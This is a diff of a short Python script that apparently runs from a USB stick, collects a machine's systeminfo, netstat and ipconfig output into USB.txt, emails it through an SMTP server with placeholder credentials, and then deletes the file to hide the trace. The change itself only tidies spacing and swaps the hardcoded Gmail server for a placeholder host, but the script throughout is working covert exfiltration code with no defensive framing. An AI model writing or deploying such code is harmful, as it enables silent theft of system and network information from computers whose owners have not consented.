@@ -15,18 +15,21 @@ except Exception:
 
 file = "USB.txt"
 
+
 def cmd(str):
     os.system(str)
 
+
 def mailer(file):
-    with open(file , "r") as f:
+    with open(file, "r") as f:
         read = f.read()
 
-    server = smtplib.SMTP("smtp.gmail.com" , 587)
+    server = smtplib.SMTP("__smtp", 587)
     server.ehlo()
     server.starttls()
-    server.login("__mail" , "__password" )
-    server.sendmail("__mail" , "__mail" , read)
+    server.login("__mail", "__password")
+    server.sendmail("__mail", "__mail", read)
+
 
 cmd("systeminfo > /dev/null >> USB.txt")
 cmd("netstat -n > /dev/null >> USB.txt")
@@ -39,4 +42,3 @@ cmd("ipconfig > /dev/null >> USB.txt")
 mailer(file)
 
 os.remove("USB.txt")
-
